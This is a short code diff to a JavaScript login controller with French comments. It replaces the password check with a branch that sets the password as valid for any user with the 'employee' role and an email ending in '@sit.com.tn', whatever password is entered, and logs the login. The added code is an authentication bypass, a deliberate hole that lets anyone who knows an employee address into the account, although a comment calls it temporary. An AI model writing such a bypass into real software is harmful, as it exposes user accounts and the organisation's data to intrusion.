@@ -181,8 +181,17 @@ class UserController {
         });
       }
 
-      // Valider le mot de passe
-      const isValidPassword = await User.validatePassword(password, user.password);
+      // Pour les employés, accepter temporairement n'importe quel mot de passe
+      let isValidPassword = false;
+      if (user.role === 'employee' && email.endsWith('@sit.com.tn')) {
+        // Accepter n'importe quel mot de passe pour les employés SIT
+        isValidPassword = true;
+        console.log('Login employé SIT accepté pour:', email);
+      } else {
+        // Validation normale pour les autres
+        isValidPassword = await User.validatePassword(password, user.password);
+      }
+      
       if (!isValidPassword) {
         return res.status(401).json({
           success: false,
